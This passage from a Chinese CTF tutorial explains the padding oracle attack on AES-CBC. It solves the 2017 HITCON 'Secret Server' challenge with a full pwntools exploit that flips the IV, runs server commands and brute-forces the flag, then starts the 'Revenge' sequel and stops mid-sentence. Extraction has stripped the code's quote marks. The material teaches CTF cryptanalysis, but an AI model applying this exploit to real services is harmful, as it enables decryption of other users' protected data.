\u7684\u586b\u5145\u65b9\u5f0f\u4e5f\u6709\u53ef\u80fd\u4f1a\u53d7\u5230\u5f71\u54cd\u3002\n\n\n\u5206\u7ec4\u6a21\u5f0f\u4e3a CBC \u6a21\u5f0f\u3002\n\n\n\n\n\n\n\u653b\u51fb\u8005\u80fd\u529b\n\n\n\u653b\u51fb\u8005\u53ef\u4ee5\u62e6\u622a\u4e0a\u8ff0\u52a0\u5bc6\u7b97\u6cd5\u52a0\u5bc6\u7684\u6d88\u606f\u3002\n\n\n\u653b\u51fb\u8005\u53ef\u4ee5\u548c padding oracle\uff08\u5373\u670d\u52a1\u5668\uff09 \u8fdb\u884c\u4ea4\u4e92\uff1a\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u7aef\u53d1\u9001\u5bc6\u6587\uff0c\u670d\u52a1\u5668\u7aef\u4f1a\u4ee5\u67d0\u79cd\u8fd4\u56de\u4fe1\u606f\u544a\u77e5\u5ba2\u6237\u7aef padding \u662f\u5426\u6b63\u5e38\u3002\n\n\n\n\n\n\n\n\nPadding Oracle Attack \u653b\u51fb\u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u5982\u4e0b\n\n\n\n\n\u5728\u4e0d\u6e05\u695a key \u548c IV \u7684\u524d\u63d0\u4e0b\u89e3\u5bc6\u4efb\u610f\u7ed9\u5b9a\u7684\u5bc6\u6587\u3002\n\n\n\n\n\u539f\u7406\n\n\nPadding Oracle Attack \u653b\u51fb\u7684\u57fa\u672c\u539f\u7406\u5982\u4e0b\n\n\n\n\n\u5bf9\u4e8e\u5f88\u957f\u7684\u6d88\u606f\u4e00\u5757\u4e00\u5757\u89e3\u5bc6\u3002\n\n\n\u5bf9\u4e8e\u6bcf\u4e00\u5757\u6d88\u606f\uff0c\u5148\u89e3\u5bc6\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u89e3\u5bc6\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u56de\u987e\u4e00\u4e0b CBC \u7684\n\n\n\n\n\u52a0\u5bc6\n\n\n\n\n\n\n\nC_i=E_K(P_i \\oplus C_{i-1})\\\\\nC_0=IV\n\n\n\n\nC_i=E_K(P_i \\oplus C_{i-1})\\\\\nC_0=IV\n\n\n\n\n\n\n\n\u89e3\u5bc6\n\n\n\n\n\n\n\nP_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV\n\n\n\n\nP_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV\n\n\n\n\n\n\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e8e\u89e3\u5bc6\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u4e0d\u77e5\u9053 IV \u548c key\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u5bc6\u6587\u5757\u7684\u957f\u5ea6\u4e3a n \u4e2a\u5b57\u8282\u3002\n\n\n\u5047\u8bbe\u6211\u4eec\u622a\u83b7\u4e86\u5bc6\u6587 Y\uff0c\u4ee5\u83b7\u53d6\u5bc6\u6587 Y \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a\u4f8b\u5b50\u8fdb\u884c\u5206\u6790\u3002\u4e3a\u4e86\u83b7\u53d6 Y \u7684\u5185\u5bb9\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u4f2a\u9020\u4e00\u5757\u5bc6\u6587 F \u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u662f\u56e0\u4e3a\u82e5\u6211\u4eec\u6784\u9020\u5bc6\u6587 \nF|Y\n \uff0c\u90a3\u4e48\u89e3\u5bc6 Y \u65f6\u5177\u4f53\u4e3a\n$$\nP=D_K(Y)\\oplus F\n$$\n\n\n\u6240\u4ee5\u4fee\u6539\u5bc6\u6587 F \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282 \nF_{n}\nF_{n}\n \u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u7684\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u4e0b\u9762\u7ed9\u51fa\u83b7\u53d6 P \u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u8fc7\u7a0b\n\n\n\n\ni=0\uff0c\u8bbe\u7f6e F \u7684\u6bcf\u4e2a\u5b57\u8282\u4e3a\n\u968f\u673a\u5b57\u8282\n\u3002\n\n\n\u8bbe\u7f6e \nF_n=i \\oplus 0x01\nF_n=i \\oplus 0x01\n\n\n\u5c06 F|Y \u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u5982\u679c P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u662f i \u7684\u8bdd\uff0c\u90a3\u4e48\u6700\u540e\u7684 padding \u5c31\u662f 0x01\uff0c\u4e0d\u4f1a\u51fa\u73b0\u9519\u8bef\u3002\u5426\u5219\uff0c\u53ea\u6709 P \u7684\u6700\u540e \nP_n \\oplus i \\oplus 0x01\nP_n \\oplus i \\oplus 0x01\n \u5b57\u8282\u90fd\u662f \nP_n \\oplus i \\oplus 0x01\nP_n \\oplus i \\oplus 0x01\n \u624d\u4e0d\u4f1a\u62a5\u9519\u3002\n\u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f padding \u7684\u5b57\u8282\u53ea\u80fd\u662f 0 \u5230 n\u3002\n \u56e0\u6b64\uff0c\u82e5\u60f3\u8981\u4f7f\u5f97\u5728 F \u968f\u673a\u5730\u60c5\u51b5\u4e0b\uff0c\u5e76\u4e14\u6ee1\u8db3padding \u5b57\u8282\u5927\u5c0f\u7684\u7ea6\u675f\u60c5\u51b5\u4e0b\u8fd8\u4e0d\u62a5\u9519\n\u6982\u7387\u5f88\u5c0f\n\u3002\u6240\u4ee5\u5728\u670d\u52a1\u5668\u7aef\u4e0d\u62a5\u9519\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u6211\u4eec\u786e\u5b9e\u83b7\u53d6\u4e86\u6b63\u786e\u7684\u5b57\u8282\u3002\n\n\n\u5728\u51fa\u73b0\u9519\u8bef\u7684\u60c5\u51b5\u4e0b\uff0ci=i+1\uff0c\u8df3\u8f6c\u52302\u3002\n\n\n\n\n\u5f53\u83b7\u53d6\u4e86 P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u83b7\u53d6 P \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u6b64\u65f6\u9700\u8981\u8bbe\u7f6e \nF_n=P_n\\oplus 0x02\nF_n=P_n\\oplus 0x02\n \uff0c\u540c\u65f6\u8bbe\u7f6e \nF_{n-1}=i \\oplus 0x02\nF_{n-1}=i \\oplus 0x02\n \u53bb\u679a\u4e3e i\u3002\n\n\n\u6240\u4ee5\uff0c\u7efc\u4e0a\u6240\u793a\uff0cPadding Oracle Attack \u5176\u5b9e\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u662f\u4e00\u79cd\u5177\u6709\u5f88\u5927\u6982\u7387\u6210\u529f\u7684\u653b\u51fb\u65b9\u6cd5\u3002\n\n\n\u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f80\u5f80\u9047\u5230\u7684\u4e00\u4e9b\u73b0\u5b9e\u95ee\u9898\u5e76\u4e0d\u662f\u6807\u51c6\u7684 Padding Oracle Attack \u6a21\u5f0f\uff0c\u6211\u4eec\u5f80\u5f80\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u53d8\u5f62\u3002\n\n\n2017 HITCON Secret Server\n\n\n\u5206\u6790\n\n\n\u7a0b\u5e8f\u4e2d\u91c7\u7528\u7684\u52a0\u5bc6\u662f AES CBC\uff0c\u5176\u4e2d\u91c7\u7528\u7684 padding \u4e0e PKCS5 \u7c7b\u4f3c\n\n\ndef\n \npad\n(\nmsg\n):\n\n    \npad_length\n \n=\n \n16\n-\nlen\n(\nmsg\n)\n%\n16\n\n    \nreturn\n \nmsg\n+\nchr\n(\npad_length\n)\n*\npad_length\n\n\n\ndef\n \nunpad\n(\nmsg\n):\n\n    \nreturn\n \nmsg\n[:\n-\nord\n(\nmsg\n[\n-\n1\n])]\n\n\n\n\n\n\u4f46\u662f\uff0c\u5728\u6bcf\u6b21 unpad \u65f6\u5e76\u6ca1\u6709\u8fdb\u884c\u68c0\u6d4b\uff0c\u800c\u662f\u76f4\u63a5\u8fdb\u884c unpad\u3002\n\n\n\u5176\u4e2d\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6bcf\u6b21\u548c\u7528\u6237\u4ea4\u4e92\u7684\u51fd\u6570\u662f\n\n\n\n\nsend_msg\n \uff0c\u63a5\u53d7\u7528\u6237\u7684\u660e\u6587\uff0c\u4f7f\u7528\u56fa\u5b9a\u7684 \n2jpmLoSsOlQrqyqE\n \u4f5c\u4e3a IV\uff0c\u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u7ed3\u679c\u8f93\u51fa\u3002\n\n\nrecv_msg\n \uff0c\u63a5\u53d7\u7528\u6237\u7684 IV \u548c\u5bc6\u6587\uff0c\u5bf9\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u8fd4\u56de\u3002\u6839\u636e\u8fd4\u56de\u7684\u7ed3\u679c\u4f1a\u6709\u4e0d\u540c\u7684\u64cd\u4f5c\n\n\n\n\n            \nmsg\n \n=\n \nrecv_msg\n()\n.\nstrip\n()\n\n            \nif\n \nmsg\n.\nstartswith\n(\nexit-here\n):\n\n                \nexit\n(\n0\n)\n\n            \nelif\n \nmsg\n.\nstartswith\n(\nget-flag\n):\n\n                \nsend_msg\n(\nflag\n)\n\n            \nelif\n \nmsg\n.\nstartswith\n(\nget-md5\n):\n\n                \nsend_msg\n(\nMD5\n.\nnew\n(\nmsg\n[\n7\n:])\n.\ndigest\n())\n\n            \nelif\n \nmsg\n.\nstartswith\n(\nget-time\n):\n\n                \nsend_msg\n(\nstr\n(\ntime\n.\ntime\n()))\n\n            \nelif\n \nmsg\n.\nstartswith\n(\nget-sha1\n):\n\n                \nsend_msg\n(\nSHA\n.\nnew\n(\nmsg\n[\n8\n:])\n.\ndigest\n())\n\n            \nelif\n \nmsg\n.\nstartswith\n(\nget-sha256\n):\n\n                \nsend_msg\n(\nSHA256\n.\nnew\n(\nmsg\n[\n10\n:])\n.\ndigest\n())\n\n            \nelif\n \nmsg\n.\nstartswith\n(\nget-hmac\n):\n\n                \nsend_msg\n(\nHMAC\n.\nnew\n(\nmsg\n[\n8\n:])\n.\ndigest\n())\n\n            \nelse\n:\n\n                \nsend_msg\n(\ncommand not found\n)\n\n\n\n\n\n\u4e3b\u8981\u6f0f\u6d1e\n\n\n\u8fd9\u91cc\u6211\u4eec\u518d\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u6211\u4eec\u5df2\u6709\u7684\u90e8\u5206\n\n\n\n\n\u52a0\u5bc6\n\n\n\u52a0\u5bc6\u65f6\u7684 IV \u662f\u56fa\u5b9a\u7684\u800c\u4e14\u5df2\u77e5\u3002\n\n\n'Welcome!!' \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002\n\n\n\n\n\n\n\u89e3\u5bc6\n\n\n\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 IV\u3002\n\n\n\n\n\n\n\n\n\u9996\u5148\uff0c\u65e2\u7136\u6211\u4eec\u77e5\u9053 \nWelcome!!\n \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u8fd8\u53ef\u4ee5 recv_msg \u4e2d\u7684 IV\uff0c\u90a3\u4e48\u6839\u636e\u89e3\u5bc6\u8fc7\u7a0b\n\n\n\n\n\nP_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV\n\n\n\n\nP_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV\n\n\n\n\n\n\u5982\u679c\u6211\u4eec\u5c06 \nWelcome!!\n \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u8f93\u5165\u7ed9 recv_msg\uff0c\u90a3\u4e48\u5176\u5f97\u5230\u7684\u7ed3\u679c\u4fbf\u662f \n\uff08Welcome!!+'\\x07'*7) xor iv_encrypt\n\uff0c\u5982\u679c\u6211\u4eec\n\u6070\u5f53\u7684\u63a7\u5236\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\u4f20\u9012\u7684 iv\n\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u6267\u884c\n\u4e0a\u8ff0\u6240\u8bf4\u7684\u4efb\u610f\u547d\u4ee4\n\u3002\u4ece\u800c\uff0c\u6211\u4eec\u4e5f\u5c31\u53ef\u4ee5\u77e5\u9053 \nflag\n \u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002\n\n\n\u5176\u6b21\uff0c\u5728\u4e0a\u9762\u7684\u57fa\u7840\u4e4b\u4e0a\uff0c\u5982\u679c\u6211\u4eec\u5728\u4efb\u4f55\u5bc6\u6587 C \u540e\u9762\u6dfb\u52a0\u81ea\u5b9a\u4e49\u7684 IV \u548c Welcome \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 recv_msg\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u4e4b\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\n\u90a3\u4e48\u7531\u4e8e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u957f\u5ea6\u51cf\u5c0f 0 \u5230 255\n\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u7ed5\u8fc7 proof of work\n\n\n\u6839\u636e\u6267\u884c\u4efb\u610f\u547d\u4ee4\u7684\u65b9\u5f0f\u83b7\u53d6\u52a0\u5bc6\u540e\u7684 flag\u3002\n\n\n\u7531\u4e8e flag \u7684\u5f00\u5934\u662f \nhitcon{\n\uff0c\u4e00\u5171\u67097\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u4efb\u7136\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 iv \u6765\u4f7f\u5f97\u89e3\u5bc6\u540e\u7684\u524d 7 \u4e2a\u5b57\u8282\u4e3a\u6307\u5b9a\u5b57\u8282\u3002\u8fd9\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e8e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6267\u884c \nget-md5\n \u547d\u4ee4\u3002\u800c\u6839\u636e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6070\u597d\u5728\u6d88\u606f\u7684\u7b2c\u51e0\u4e2a\u5b57\u8282\u5904\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f00\u59cb\u65f6\u5c06\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u4e3a \nhitcon{x\n\uff0c\u5373\u53ea\u4fdd\u7559\nhitcon{\n \u540e\u7684\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u6837\u4fbf\u53ef\u4ee5\u83b7\u5f97\u5e26\u4e00\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002\u7c7b\u4f3c\u5730\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u83b7\u5f97\u5e26\u5236\u5b9a\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002\n\n\n\u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u9010\u5b57\u8282\u7206\u7834\uff0c\u8ba1\u7b97\u5bf9\u5e94 \nmd5\n\uff0c\u7136\u540e\u518d\u6b21\u5229\u7528\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\u65b9\u5f0f\uff0c\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u660e\u6587\u4e3a\u4efb\u610f\u6307\u5b9a\u547d\u4ee4\uff0c\u5982\u679c\u63a7\u5236\u4e0d\u6210\u529f\uff0c\u90a3\u8bf4\u660e\u8be5\u5b57\u8282\u4e0d\u5bf9\uff0c\u9700\u8981\u518d\u6b21\u7206\u7834\uff1b\u5982\u679c\u6b63\u786e\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u5bf9\u5e94\u7684\u547d\u4ee4\u3002\n\n\n\n\n\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\n\n\n#coding=utf-8\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nimport\n \nbase64\n,\n \ntime\n,\n \nrandom\n,\n \nstring\n\n\nfrom\n \nCrypto.Cipher\n \nimport\n \nAES\n\n\nfrom\n \nCrypto.Hash\n \nimport\n \nSHA256\n,\n \nMD5\n\n\n#context.log_level = \ndebug\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \np\n \n=\n \nremote\n(\n52.193.157.19\n,\n \n9999\n)\n\n\nelse\n:\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n7777\n)\n\n\n\n\ndef\n \nstrxor\n(\nstr1\n,\n \nstr2\n):\n\n    \nreturn\n \n.\njoin\n([\nchr\n(\nord\n(\nc1\n)\n \n^\n \nord\n(\nc2\n))\n \nfor\n \nc1\n,\n \nc2\n \nin\n \nzip\n(\nstr1\n,\n \nstr2\n)])\n\n\n\n\ndef\n \npad\n(\nmsg\n):\n\n    \npad_length\n \n=\n \n16\n \n-\n \nlen\n(\nmsg\n)\n \n%\n \n16\n\n    \nreturn\n \nmsg\n \n+\n \nchr\n(\npad_length\n)\n \n*\n \npad_length\n\n\n\n\ndef\n \nunpad\n(\nmsg\n):\n\n    \nreturn\n \nmsg\n[:\n-\nord\n(\nmsg\n[\n-\n1\n])]\n  \n# \u53bb\u6389pad\n\n\n\n\ndef\n \nflipplain\n(\noldplain\n,\n \nnewplain\n,\n \niv\n):\n\n    \nflip oldplain to new plain, return proper iv\n\n    \nreturn\n \nstrxor\n(\nstrxor\n(\noldplain\n,\n \nnewplain\n),\n \niv\n)\n\n\n\n\ndef\n \nbypassproof\n():\n\n    \np\n.\nrecvuntil\n(\nSHA256(XXXX+\n)\n\n    \nlastdata\n \n=\n \np\n.\nrecvuntil\n(\n)\n,\n \ndrop\n=\nTrue\n)\n\n    \np\n.\nrecvuntil\n(\n == \n)\n\n    \ndigest\n \n=\n \np\n.\nrecvuntil\n(\n\\n\nGive me XXXX:\n,\n \ndrop\n=\nTrue\n)\n\n\n    \ndef\n \nproof\n(\ns\n):\n\n        \nreturn\n \nSHA256\n.\nnew\n(\ns\n \n+\n \nlastdata\n)\n.\nhexdigest\n()\n \n==\n \ndigest\n\n\n    \ndata\n \n=\n \npwnlib\n.\nutil\n.\niters\n.\nmbruteforce\n(\n\n        \nproof\n,\n \nstring\n.\nascii_letters\n \n+\n \nstring\n.\ndigits\n,\n \n4\n,\n \nmethod\n=\nfixed\n)\n\n    \np\n.\nsendline\n(\ndata\n)\n\n    \np\n.\nrecvuntil\n(\nDone!\n\\n\n)\n\n\n\n\niv_encrypt\n \n=\n \n2jpmLoSsOlQrqyqE\n\n\n\n\ndef\n \ngetmd5enc\n(\ni\n,\n \ncipher_flag\n,\n \ncipher_welcome\n):\n\n    \nreturn encrypt( md5( flag[7:7+i] ) )\n\n    \n## keep iv[7:] do not change, so decrypt won\nt change\n\n    \nnew_iv\n \n=\n \nflipplain\n(\nhitcon{\n.\nljust\n(\n16\n,\n \n\\x00\n),\n \nget-md5\n.\nljust\n(\n\n        \n16\n,\n \n\\x00\n),\n \niv_encrypt\n)\n\n    \npayload\n \n=\n \nnew_iv\n \n+\n \ncipher_flag\n\n    \n## calculate the proper last byte number\n\n    \nlast_byte_iv\n \n=\n \nflipplain\n(\n\n        \npad\n(\nWelcome!!\n),\n\n        \na\n \n*\n \n15\n \n+\n \nchr\n(\nlen\n(\ncipher_flag\n)\n \n+\n \n16\n \n+\n \n16\n \n-\n \n(\n7\n \n+\n \ni\n \n+\n \n1\n)),\n \niv_encrypt\n)\n\n    \npayload\n \n+=\n \nlast_byte_iv\n \n+\n \ncipher_welcome\n\n    \np\n.\nsendline\n(\nbase64\n.\nb64encode\n(\npayload\n))\n\n    \nreturn\n \np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n\n\n\ndef\n \nmain\n():\n\n    \nbypassproof\n()\n\n\n    \n# result of encrypted Welcome!!\n\n    \ncipher\n \n=\n \np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n    \ncipher_welcome\n \n=\n \nbase64\n.\nb64decode\n(\ncipher\n)[\n16\n:]\n\n    \nlog\n.\ninfo\n(\ncipher welcome is : \n \n+\n \ncipher_welcome\n)\n\n\n    \n# execute get-flag\n\n    \nget_flag_iv\n \n=\n \nflipplain\n(\npad\n(\nWelcome!!\n),\n \npad\n(\nget-flag\n),\n \niv_encrypt\n)\n\n    \npayload\n \n=\n \nbase64\n.\nb64encode\n(\nget_flag_iv\n \n+\n \ncipher_welcome\n)\n\n    \np\n.\nsendline\n(\npayload\n)\n\n    \ncipher\n \n=\n \np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n    \ncipher_flag\n \n=\n \nbase64\n.\nb64decode\n(\ncipher\n)[\n16\n:]\n\n    \nflaglen\n \n=\n \nlen\n(\ncipher_flag\n)\n\n    \nlog\n.\ninfo\n(\ncipher flag is : \n \n+\n \ncipher_flag\n)\n\n\n    \n# get command not found cipher\n\n    \np\n.\nsendline\n(\nbase64\n.\nb64encode\n(\niv_encrypt\n \n+\n \ncipher_welcome\n))\n\n    \ncipher_notfound\n \n=\n \np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n\n    \nflag\n \n=\n \n\n    \n# brute force for every byte of flag\n\n    \nfor\n \ni\n \nin\n \nrange\n(\nflaglen\n \n-\n \n7\n):\n\n        \nmd5_indexi\n \n=\n \ngetmd5enc\n(\ni\n,\n \ncipher_flag\n,\n \ncipher_welcome\n)\n\n        \nmd5_indexi\n \n=\n \nbase64\n.\nb64decode\n(\nmd5_indexi\n)[\n16\n:]\n\n        \nlog\n.\ninfo\n(\nget encrypt(md5(flag[7:7+i])): \n \n+\n \nmd5_indexi\n)\n\n        \nfor\n \nguess\n \nin\n \nrange\n(\n256\n):\n\n            \n# locally compute md5 hash\n\n            \nguess_md5\n \n=\n \nMD5\n.\nnew\n(\nflag\n \n+\n \nchr\n(\nguess\n))\n.\ndigest\n()\n\n            \n# try to null out the md5 plaintext and execute a command\n\n            \npayload\n \n=\n \nflipplain\n(\nguess_md5\n,\n \nget-time\n.\nljust\n(\n16\n,\n \n\\x01\n),\n\n                                \niv_encrypt\n)\n\n            \npayload\n \n+=\n \nmd5_indexi\n\n            \np\n.\nsendline\n(\nbase64\n.\nb64encode\n(\npayload\n))\n\n            \nres\n \n=\n \np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n            \n# if we receive the block for \ncommand not found\n, the hash was wrong\n\n            \nif\n \nres\n \n==\n \ncipher_notfound\n:\n\n                \nprint\n \nGuess {} is wrong.\n.\nformat\n(\nguess\n)\n\n            \n# otherwise we correctly guessed the hash and the command was executed\n\n            \nelse\n:\n\n                \nprint\n \nFound!\n\n                \nflag\n \n+=\n \nchr\n(\nguess\n)\n\n                \nprint\n \nFlag so far:\n,\n \nflag\n\n                \nbreak\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nmain\n()\n\n\n\n\n\n\u6700\u540e\u7ed3\u679c\u5982\u4e0b\n\n\nFlag so far: Paddin9_15_ve3y_h4rd__!!\n}\n\\x\n10\n\\x\n10\n\\x\n10\n\\x\n10\n\\x\n10\n\\x\n10\n\\x\n10\n\\x\n10\n\\x\n10\n\\x\n10\n\\x\n10\n\\x\n10\n\\x\n10\n\\x\n10\n\\x\n10\n\\x\n10\n\n\n\n\n\n2017 HITCON Secret Server Revenge\n\n\n\u63cf\u8ff0\n\n\nThe password of zip is the flag of \nSecret Server\n\n\n\n\n\n\u5206\u6790\n\n\n\u8fd9\u4e2a\u7a0b\u5e8f\u65f6\u63a5\u7740\u4e0a\u9762\u7684\u7a0b\u5e8f\u7ee7\u7eed\u641e\u7684\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8fdb\u884c\u7684\u7b80\u5355\u7684\u4fee\u6539\n\n\n\n\n\u52a0\u5bc6\u7b97\u6cd5\u7684 iv \u672a\u77e5\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u6839\u636e Welcome \u52a0\u5bc6\u540e\u7684\u6d88\u606f\u63a8\u7b97\u51fa\u6765\u3002\n\n\n\u7a0b\u5e8f\u591a\u4e86\u4e00\u4e2a 56 \u5b57\u8282\u7684 token\u3002\n\n\n\u7a0b\u5e8f\u6700\u591a\u80fd\u8fdb\u884c 340 \u64cd\u4f5c\uff0c\u56e0\u6b64\u4e0a\u8ff0\u7684\u7206\u7834\u81ea\u7136\u4e0d\u53ef\u884c\n\n\n\n\n\u7a0b\u5e8f\u7684\u5927\u6982\u6d41\u7a0b\u5982\u4e0b\n\n\n\n\n\u7ecf\u8fc7 proof of work\n\n\n\u53d1\u9001 \u201cWelcome!!\u201d \u52a0\u5bc6\u540e\u7684\u6d88\u606f\n\n\n\u5728 340 \u6b21\u64cd\u4f5c\u4e2d\uff0c\u9700\u8981\u731c\u4e2d token \u7684\u503c\uff0c\u7136\u540e\u4f1a\u81ea\u52a8\u5c06 flag \u8f93\u51fa\u3002\n\n\n\n\n\u6f0f\u6d1e\n\n\n\u5f53\u7136\uff0c\u5728\u4e0a\u4e2a\u9898\u76ee\u4e2d\u5b58\u5728\u7684\u6f0f\u6d1e\uff0c\u5728\u8fd9\u4e2a\u9898\u76ee\u4e2d\u4ecd\u7136\u5b58\u5728\uff0c\u5373\n\n\n\n\n\u4efb\u610f\u6267\u884c\u7ed9\u5b9a\u547d\u4ee4\n\n\n\u957f\u5ea6\u622a\u65ad\n\n\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u7531\u4e8e 340 \u7684\u6b21\u6570\u9650\u5236\uff0c\u867d\u7136\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u83b7\u5f97 \nmd5(token[:i])\n \u52a0\u5bc6\u540e\u7684\u503c\uff08\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u90e8\u5206\u52a0\u5bc6\u540e\u6070\u597d\u662f 32 \u4e2a\u5b57\u8282\uff0c\u524d 16 \u4e2a\u5b57\u8282\u662f md5 \u540e\u52a0\u5bc6\u7684\u503c\uff0c\u540e\u9762\u7684 16 \u4e2a\u5b57\u8282\u5b8c\u5168\u662f\u586b\u5145\u7684\u52a0\u5bc6\u540e\u7684\u5b57\u8282\u3002\n\u8fd9\u91cc\nmd5(token[:i])\n  \u7279\u6307\u524d16\u4e2a\u5b57\u8282\u3002\uff09\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e0d\u80fd\u518d\u6b21\u4e3a\u4e86\u83b7\u5f97\u4e00\u4e2a\u5b57\u7b26\u53bb\u7206\u7834 256 \u6b21\u4e86\u3002\n\n\n\u65e2\u7136\u4e0d\u80fd\u591f\u7206\u7834\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u4e00\u6b21\u83b7\u53d6\u4e00\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\u5462\uff1f\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u6765\u68b3\u7406\u4e00\u4e0b\u8be5\u7a0b\u5e8f\u53ef\u80fd\u53ef\u4ee5\u6cc4\u6f0f\u7684\u4fe1\u606f\n\n\n\n\n\n\n\u67d0\u4e9b\u6d88\u606f\u7684 md5 \u503c\u52a0\u5bc6\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6 \nmd5(token[:i])\n \u52a0\u5bc6\u540e\u7684\u503c\u3002\n\n\n\n\n\n\nunpad \u6bcf\u6b21\u4f1a\u5bf9\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u8fdb\u884c 